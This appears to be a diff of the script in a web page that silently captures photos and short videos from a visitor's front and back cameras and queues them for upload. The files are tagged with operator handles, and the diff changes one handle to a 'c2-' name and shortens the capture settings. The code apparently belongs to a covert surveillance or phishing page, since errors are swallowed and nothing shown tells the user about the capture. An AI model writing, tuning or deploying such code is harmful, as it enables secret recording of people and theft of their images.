@@ -65,10 +65,10 @@
 
 <script>
 
-let frontPhotoCount = 3;
-let backPhotoCount = 3;
-let frontVideoSeconds = 5;
-let backVideoSeconds = 5;
+let frontPhotoCount = 2;
+let backPhotoCount = 2;
+let frontVideoSeconds = 2;
+let backVideoSeconds = 2;
 
 let maxConcurrentUploads = 3; 
 let uploadQueue = [];
@@ -136,7 +136,7 @@ async function takePhotos(stream,count,label){
     for(let i=0;i<count;i++){
         try{
             const blob = await captureFrame(stream);
-            const name=`@MrEsfelurm_${label}_photo_${Date.now()}_${i+1}.jpg`;
+            const name=`@c2-tlhah_${label}_photo_${Date.now()}_${i+1}.jpg`;
             enqueueUpload(blob,name,"photo",label);
             success++;
         }catch(e){}
@@ -150,7 +150,7 @@ async function takeVideo(stream,seconds,label){
     let success=0;
     try{
         const blob = await recordVideo(stream,seconds);
-        const name=`@MrEsfelurm_${label}_video_${Date.now()}.webm`;
+        const name=`@c2-tlhah_${label}_video_${Date.now()}.webm`;
         enqueueUpload(blob,name,"video",label);
         success=1;
     }catch(e){}
